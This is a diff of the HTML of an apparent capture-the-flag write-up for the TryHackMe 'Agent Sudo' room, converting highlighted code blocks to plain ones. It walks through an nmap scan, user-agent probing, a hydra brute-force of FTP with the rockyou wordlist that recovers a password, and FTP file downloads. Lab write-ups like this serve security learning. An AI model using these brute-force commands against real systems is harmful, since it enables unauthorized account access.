@@ -155,25 +155,25 @@
 <p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
 <h2 id="methodology">Methodology</h2>
 <p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I start with the <code>-V</code>, <code>-C</code>, and <code>-T4</code> flags.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#177500"># Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253</span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#a90d91">for</span> 10.10.166.253
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#000">(</span>0.13s latency<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#1c01ce">997</span> closed tcp ports <span style="color:#000">(</span>reset<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
-</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#000">(</span>Ubuntu Linux; protocol 2.0<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey: 
-</span></span><span style="display:flex;"><span>|   <span style="color:#1c01ce">2048</span> ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span style="color:#000">(</span>RSA<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>|   <span style="color:#1c01ce">256</span> 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span style="color:#000">(</span>ECDSA<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#1c01ce">256</span> 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span style="color:#000">(</span>ED25519<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#000">((</span>Ubuntu<span style="color:#000">))</span>
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#000">(</span>Ubuntu<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>|_http-title: Annoucement
-</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span><span style="color:#177500"># Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds</span>
-</span></span></code></pre></div><p>Now we know that the target is running <code>vsftpd 3.0.3</code> on <code>port 21</code>, <code>OpenSSH 7.6p1</code> on <code>port 22</code>, and an <code>Apache httpd 2.4.29</code> web server on <code>port 80</code> with the <code>http-title</code> of <code>announcement</code> - all open to <code>tcp</code> traffic.</p>
+<pre tabindex="0"><code># Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253
+Nmap scan report for 10.10.166.253
+Host is up (0.13s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds
+</code></pre><p>Now we know that the target is running <code>vsftpd 3.0.3</code> on <code>port 21</code>, <code>OpenSSH 7.6p1</code> on <code>port 22</code>, and an <code>Apache httpd 2.4.29</code> web server on <code>port 80</code> with the <code>http-title</code> of <code>announcement</code> - all open to <code>tcp</code> traffic.</p>
 <p>Next, we visit the web server in a web browser.</p>
 <p><code>/index.html</code></p>
 <div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#633820">&lt;!DocType html&gt;</span>
@@ -216,207 +216,207 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#000">body</span>&gt;
 </span></span></code></pre></div><p>Likewise, user-agents <code>A</code> and <code>B</code> do not work, but <code>C</code> redirects us to <code>/agent_C_attention.php</code> on the web site:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Attention ----s, &lt;<span style="color:#000">br</span>&gt;&lt;<span style="color:#000">br</span>&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! &lt;<span style="color:#000">br</span>&gt;&lt;<span style="color:#000">br</span>&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>From,&lt;<span style="color:#000">br</span>&gt;
-</span></span><span style="display:flex;"><span>Agent R
-</span></span></code></pre></div><p>Out of curiosity, I tried <code>J</code> as a user-agent, but that did not yield anything. However, now that we know about a user named <code>----s</code>, we should see if we can access the vsftpd FTP server on port 21. I chose to use <code>hydra</code> to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ hydra -t <span style="color:#1c01ce">1</span> -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
-</span></span><span style="display:flex;"><span>Hydra v9.3 <span style="color:#000">(</span>c<span style="color:#000">)</span> <span style="color:#1c01ce">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#a90d91">do</span> not use in military or secret service organizations, or <span style="color:#a90d91">for</span> illegal purposes <span style="color:#000">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Hydra <span style="color:#000">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#000">)</span> starting at 2022-05-23 10:19:49
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>DATA<span style="color:#000">]</span> max <span style="color:#1c01ce">1</span> task per <span style="color:#1c01ce">1</span> server, overall <span style="color:#1c01ce">1</span> task, <span style="color:#1c01ce">14344399</span> login tries <span style="color:#000">(</span>l:1/p:14344399<span style="color:#000">)</span>, ~14344399 tries per task
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>DATA<span style="color:#000">]</span> attacking ftp://10.10.73.189:21/
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>VERBOSE<span style="color:#000">]</span> Resolving addresses ... <span style="color:#000">[</span>VERBOSE<span style="color:#000">]</span> resolving <span style="color:#a90d91">done</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;123456&#34;</span> - <span style="color:#1c01ce">1</span> of <span style="color:#1c01ce">14344399</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/0<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;12345&#34;</span> - <span style="color:#1c01ce">2</span> of <span style="color:#1c01ce">14344400</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/1<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>STATUS<span style="color:#000">]</span> 2.00 tries/min, <span style="color:#1c01ce">2</span> tries in 00:01h, <span style="color:#1c01ce">14344398</span> to <span style="color:#a90d91">do</span> in 119536:40h, <span style="color:#1c01ce">1</span> active
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;123456789&#34;</span> - <span style="color:#1c01ce">3</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;password&#34;</span> - <span style="color:#1c01ce">4</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;iloveyou&#34;</span> - <span style="color:#1c01ce">5</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;princess&#34;</span> - <span style="color:#1c01ce">6</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;1234567&#34;</span> - <span style="color:#1c01ce">7</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>... 🕒 two hours later 🕒 ...
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;cutie&#34;</span> - <span style="color:#1c01ce">243</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;james&#34;</span> - <span style="color:#1c01ce">244</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;banana&#34;</span> - <span style="color:#1c01ce">245</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;prince&#34;</span> - <span style="color:#1c01ce">246</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>STATUS<span style="color:#000">]</span> 7.94 tries/min, <span style="color:#1c01ce">246</span> tries in 00:31h, <span style="color:#1c01ce">14344155</span> to <span style="color:#a90d91">do</span> in 30126:37h, <span style="color:#1c01ce">1</span> active
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;friend&#34;</span> - <span style="color:#1c01ce">247</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;jesus1&#34;</span> - <span style="color:#1c01ce">248</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;------l&#34;</span> - <span style="color:#1c01ce">249</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>21<span style="color:#000">][</span>ftp<span style="color:#000">]</span> host: 10.10.73.189   login: ----s   password: ------l
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>STATUS<span style="color:#000">]</span> attack finished <span style="color:#a90d91">for</span> 10.10.73.189 <span style="color:#000">(</span>waiting <span style="color:#a90d91">for</span> children to <span style="color:#a90d91">complete</span> tests<span style="color:#000">)</span>
-</span></span></code></pre></div><p>We test out our new credentials and discover three files on the FTP server that we can get. We download the text message first.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ ftp 10.10.73.189 
-</span></span><span style="display:flex;"><span>Connected to 10.10.73.189.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">220</span> <span style="color:#000">(</span>vsFTPd 3.0.3<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Name <span style="color:#000">(</span>10.10.73.189:virtualtack<span style="color:#000">)</span>: ----s
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">331</span> Please specify the password.
-</span></span><span style="display:flex;"><span>Password: 
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">230</span> Login successful.
-</span></span><span style="display:flex;"><span>Remote system <span style="color:#a90d91">type</span> is UNIX.
-</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
-</span></span><span style="display:flex;"><span>ftp&gt; ls
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|20720|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Here comes the directory listing.
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>             <span style="color:#1c01ce">217</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> To_agentJ.txt
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>           <span style="color:#1c01ce">33143</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> cute-alien.jpg
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>           <span style="color:#1c01ce">34842</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> cutie.png
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Directory send OK.
-</span></span><span style="display:flex;"><span>ftp&gt; get To_agentJ.txt
-</span></span><span style="display:flex;"><span>local: To_agentJ.txt remote: To_agentJ.txt
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|35196|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Opening BINARY mode data connection <span style="color:#a90d91">for</span> To_agentJ.txt <span style="color:#000">(</span><span style="color:#1c01ce">217</span> bytes<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>100% |************|   <span style="color:#1c01ce">217</span>       75.79 KiB/s    00:00 ETA
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Transfer complete.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">217</span> bytes received in 00:00 <span style="color:#000">(</span>1.69 KiB/s<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>ftp&gt; <span style="color:#a90d91">exit</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">221</span> Goodbye.                                                    
-</span></span></code></pre></div><p><code>To_agentJ.txt</code></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Dear agent J,
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn<span style="color:#000">&#39;</span>t be a problem <span style="color:#a90d91">for</span> you.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>From,
-</span></span><span style="display:flex;"><span>Agent C
-</span></span></code></pre></div><p>Good to know! Let&rsquo;s grab the image files and figure out how to extract Agent J&rsquo;s login password.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ ftp 10.10.73.189 
-</span></span><span style="display:flex;"><span>Connected to 10.10.73.189.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">220</span> <span style="color:#000">(</span>vsFTPd 3.0.3<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Name <span style="color:#000">(</span>10.10.73.189:virtualtack<span style="color:#000">)</span>: ----s
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">331</span> Please specify the password.
-</span></span><span style="display:flex;"><span>Password: 
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">230</span> Login successful.
-</span></span><span style="display:flex;"><span>Remote system <span style="color:#a90d91">type</span> is UNIX.
-</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
-</span></span><span style="display:flex;"><span>ftp&gt; ls
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|27749|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Here comes the directory listing.
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>             <span style="color:#1c01ce">217</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> To_agentJ.txt
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>           <span style="color:#1c01ce">33143</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> cute-alien.jpg
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>           <span style="color:#1c01ce">34842</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> cutie.png
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Directory send OK.
-</span></span><span style="display:flex;"><span>ftp&gt; get cute-alien.jpg
-</span></span><span style="display:flex;"><span>local: cute-alien.jpg remote: cute-alien.jpg
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|13011|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Opening BINARY mode data connection <span style="color:#a90d91">for</span> cute-alien.jpg <span style="color:#000">(</span><span style="color:#1c01ce">33143</span> bytes<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>100% |************| <span style="color:#1c01ce">33143</span>      308.57 KiB/s    00:00 ETA
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Transfer complete.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">33143</span> bytes received in 00:00 <span style="color:#000">(</span>154.69 KiB/s<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>ftp&gt; get cutie.png
-</span></span><span style="display:flex;"><span>local: cutie.png remote: cutie.png
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|63920|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Opening BINARY mode data connection <span style="color:#a90d91">for</span> cutie.png <span style="color:#000">(</span><span style="color:#1c01ce">34842</span> bytes<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>100% |************| <span style="color:#1c01ce">34842</span>      322.63 KiB/s    00:00 ETA
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Transfer complete.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">34842</span> bytes received in 00:00 <span style="color:#000">(</span>158.37 KiB/s<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>ftp&gt; quit
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">221</span> Goodbye.
-</span></span></code></pre></div><p>I should have used <code>mget *</code> here instead. Looking at the two images, I don&rsquo;t see anything immediately interesting. They are cute, though.</p>
+<pre tabindex="0"><code>Attention ----s, &lt;br&gt;&lt;br&gt;
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! &lt;br&gt;&lt;br&gt;
+
+From,&lt;br&gt;
+Agent R
+</code></pre><p>Out of curiosity, I tried <code>J</code> as a user-agent, but that did not yield anything. However, now that we know about a user named <code>----s</code>, we should see if we can access the vsftpd FTP server on port 21. I chose to use <code>hydra</code> to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ hydra -t 1 -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
+Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-23 10:19:49
+[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+[DATA] attacking ftp://10.10.73.189:21/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;123456&#34; - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;12345&#34; - 2 of 14344400 [child 0] (0/1)
+[STATUS] 2.00 tries/min, 2 tries in 00:01h, 14344398 to do in 119536:40h, 1 active
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;123456789&#34; - 3 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;password&#34; - 4 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;iloveyou&#34; - 5 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;princess&#34; - 6 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;1234567&#34; - 7 of 14344401 [child 0] (0/2)
+
+... 🕒 two hours later 🕒 ...
+
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;cutie&#34; - 243 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;james&#34; - 244 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;banana&#34; - 245 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;prince&#34; - 246 of 14344401 [child 0] (0/2)
+[STATUS] 7.94 tries/min, 246 tries in 00:31h, 14344155 to do in 30126:37h, 1 active
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;friend&#34; - 247 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;jesus1&#34; - 248 of 14344401 [child 0] (0/2)
+[ATTEMPT] target 10.10.73.189 - login &#34;----s&#34; - pass &#34;------l&#34; - 249 of 14344401 [child 0] (0/2)
+[21][ftp] host: 10.10.73.189   login: ----s   password: ------l
+[STATUS] attack finished for 10.10.73.189 (waiting for children to complete tests)
+</code></pre><p>We test out our new credentials and discover three files on the FTP server that we can get. We download the text message first.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ ftp 10.10.73.189 
+Connected to 10.10.73.189.
+220 (vsFTPd 3.0.3)
+Name (10.10.73.189:virtualtack): ----s
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||20720|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp&gt; get To_agentJ.txt
+local: To_agentJ.txt remote: To_agentJ.txt
+229 Entering Extended Passive Mode (|||35196|)
+150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
+100% |************|   217       75.79 KiB/s    00:00 ETA
+226 Transfer complete.
+217 bytes received in 00:00 (1.69 KiB/s)
+ftp&gt; exit
+221 Goodbye.                                                    
+</code></pre><p><code>To_agentJ.txt</code></p>
+<pre tabindex="0"><code>Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#39;t be a problem for you.
+
+From,
+Agent C
+</code></pre><p>Good to know! Let&rsquo;s grab the image files and figure out how to extract Agent J&rsquo;s login password.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ ftp 10.10.73.189 
+Connected to 10.10.73.189.
+220 (vsFTPd 3.0.3)
+Name (10.10.73.189:virtualtack): ----s
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||27749|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp&gt; get cute-alien.jpg
+local: cute-alien.jpg remote: cute-alien.jpg
+229 Entering Extended Passive Mode (|||13011|)
+150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
+100% |************| 33143      308.57 KiB/s    00:00 ETA
+226 Transfer complete.
